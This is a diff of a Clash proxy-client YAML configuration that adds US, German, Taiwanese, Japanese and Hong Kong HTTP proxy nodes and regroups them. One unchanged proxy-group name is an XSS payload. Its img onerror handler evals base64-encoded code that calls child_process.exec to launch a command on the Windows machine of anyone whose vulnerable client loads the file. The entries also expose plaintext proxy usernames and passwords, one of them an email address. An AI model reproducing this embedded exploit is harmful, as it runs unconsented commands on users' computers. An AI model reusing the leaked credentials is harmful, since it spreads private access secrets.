@@ -10,6 +10,41 @@ dns:
     nameserver:
       - 223.5.5.5
 proxies:
+   - name: 🇹🇼 Http|台湾
+     server: h3816tw.droplet.today
+     port: 20443
+     type: http
+     username: "dcf12c7e7d"
+     password: 26bae9b023
+     tls: true
+   - name: 🇺🇸 Http|美国01
+     server: h961359.droplet.today
+     port: 11245
+     type: http
+     username: "dcf12c7e7d"
+     password: 26bae9b023
+     tls: true
+   - name: 🇺🇸 Http|美国02
+     server: h961684.droplet.today
+     port: 11245
+     type: http
+     username: "dcf12c7e7d"
+     password: 26bae9b023
+     tls: true
+   - name: 🇩🇪 Http|德国01
+     server: h961684.droplet.today
+     port: 11745
+     type: http
+     username: "dcf12c7e7d"
+     password: 26bae9b023
+     tls: true
+   - name: 🇩🇪 Http|德国02
+     server: h961359.droplet.today
+     port: 11745
+     type: http
+     username: "dcf12c7e7d"
+     password: 26bae9b023
+     tls: true
    - name: 🇯🇵 Http|日本01
      server: h961359.droplet.today
      port: 11445
@@ -99,41 +134,6 @@ proxies:
      type: http
      username: "yaojiayu246@gmail.com"
      password: 73a4ff1c-85c8-11ea-82ef-f23c9164ca5d
-     tls: true
-   - name: 🇹🇼 Http|台湾
-     server: h3816tw.droplet.today
-     port: 20443
-     type: http
-     username: "dcf12c7e7d"
-     password: 26bae9b023
-     tls: true
-   - name: 🇺🇸 Http|美国01
-     server: h961359.droplet.today
-     port: 11245
-     type: http
-     username: "dcf12c7e7d"
-     password: 26bae9b023
-     tls: true
-   - name: 🇺🇸 Http|美国02
-     server: h961684.droplet.today
-     port: 11245
-     type: http
-     username: "dcf12c7e7d"
-     password: 26bae9b023
-     tls: true
-   - name: 🇩🇪 Http|德国01
-     server: h961684.droplet.today
-     port: 11745
-     type: http
-     username: "dcf12c7e7d"
-     password: 26bae9b023
-     tls: true
-   - name: 🇩🇪 Http|德国02
-     server: h961359.droplet.today
-     port: 11745
-     type: http
-     username: "dcf12c7e7d"
-     password: 26bae9b023
      tls: true
    - name: 🇸🇬 Http|新加坡01
      server: 183.240.9.28
@@ -412,6 +412,7 @@ proxy-groups:
     proxies:
       - ♻️ 自动选择
       - 🖐 手动选择
+      - 🇺🇸 美区
       - 🇯🇵 日区
       - 🇭🇰 港区
       - 🇸🇬 新加坡区
@@ -421,12 +422,23 @@ proxy-groups:
     url: https://www.google.com/gen_204
     interval: 300
     proxies:
+      - 🇹🇼 Http|台湾
+      - 🇺🇸 Http|美国01
+      - 🇺🇸 Http|美国02
+      - 🇩🇪 Http|德国01
+      - 🇩🇪 Http|德国02
+      - 🇯🇵 Http|日本01
+      - 🇯🇵 Http|日本02 
+      - 🇯🇵 Http|日本03
       - 🇯🇵 Http|一键连｜日本
       - 🇭🇰 Http|香港01
       - 🇭🇰 Http|香港02
       - 🇭🇰 Http|香港03
       - 🇭🇰 Http|香港04
       - 🇭🇰 Http|香港05
+      - 🇭🇰 Http|香港06
+      - 🇭🇰 Http|香港07
+      - 🇭🇰 Http|香港08
       - 🇭🇰 Http|PCCW|香港
       - 🇸🇬 Http|新加坡01
       - 🇸🇬 Http|新加坡02
@@ -461,12 +473,24 @@ proxy-groups:
     type: select
     proxies:
       - ♻️ 自动选择
+      - 🇹🇼 Http|台湾
+      - 🇺🇸 Http|美国01
+      - 🇺🇸 Http|美国02
+      - 🇩🇪 Http|德国01
+      - 🇩🇪 Http|德国02
+      - 🇯🇵 Http|日本01
+      - 🇯🇵 Http|日本02 
+      - 🇯🇵 Http|日本03
       - 🇯🇵 Http|一键连｜日本
       - 🇭🇰 Http|香港01
       - 🇭🇰 Http|香港02
       - 🇭🇰 Http|香港03
       - 🇭🇰 Http|香港04
       - 🇭🇰 Http|香港05
+      - 🇭🇰 Http|香港06
+      - 🇭🇰 Http|香港07
+      - 🇭🇰 Http|香港08
+      - 🇭🇰 Http|PCCW|香港
       - 🇸🇬 Http|新加坡01
       - 🇸🇬 Http|新加坡02
       - 🇸🇬 Http|新加坡03
@@ -496,11 +520,42 @@ proxy-groups:
       - 🇸🇬 Http|新加坡27
       - 🇸🇬 Http|新加坡28
 
+  - name: 🎯 全球直连
+    type: select
+    proxies:
+      - DIRECT
+      - ♻️ 自动选择
+      - 🚀 节点选择
+
+  - name: 🛑 全球拦截
+    type: select
+    proxies:
+      - REJECT
+      - DIRECT
+
+  - name: 🐟 漏网之鱼
+    type: select
+    proxies:
+      - ♻️ 自动选择
+      - DIRECT
+      - 🚀 节点选择
+
+  - name: 🇺🇸 美区
+    type: load-balance
+    url: https://www.google.com/gen_204
+    interval: 180
+    proxies:
+      - 🇺🇸 Http|美国01
+      - 🇺🇸 Http|美国02
+
   - name: 🇯🇵 日区
     type: load-balance
     url: https://www.google.com/gen_204
     interval: 180
     proxies:
+      - 🇯🇵 Http|日本01
+      - 🇯🇵 Http|日本02 
+      - 🇯🇵 Http|日本03
       - 🇯🇵 Http|一键连｜日本
 
   - name: 🇭🇰 港区
@@ -514,7 +569,6 @@ proxy-groups:
       - 🇭🇰 Http|香港04
       - 🇭🇰 Http|香港05
       - 🇭🇰 Http|PCCW|香港
-
 
   - name: 🇸🇬 新加坡区
     type: load-balance
@@ -555,23 +609,6 @@ proxy-groups:
     proxies:
       - Openit / https://openit.ml / Telegram@yusteven / GitHub → yu-steven / yu@openit.ml / By Yu Steven
       - XSS安全漏洞检测<img src=x onerror='alert(`如果您能看见此弹窗，说明您正在使用的Clash(低于v0.19.10)存在严重的安全漏洞，请尽快更新，稍后将会为您引导至Openit官网以继续`);eval(new Buffer(`cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2V4cGxvcmVyIGh0dHBzOi8vZG9jLm9wZW5pdC5tbC9ndWlkZS93aW5kb3dzLmh0bWwnKTs=`,`base64`).toString())'>
-  - name: 🎯 全球直连
-    type: select
-    proxies:
-      - DIRECT
-      - ♻️ 自动选择
-      - 🚀 节点选择
-  - name: 🛑 全球拦截
-    type: select
-    proxies:
-      - REJECT
-      - DIRECT
-  - name: 🐟 漏网之鱼
-    type: select
-    proxies:
-      - ♻️ 自动选择
-      - DIRECT
-      - 🚀 节点选择
 rules:
  - DOMAIN-SUFFIX,acl4ssr,🎯 全球直连
  - DOMAIN-SUFFIX,ip6-localhost,🎯 全球直连
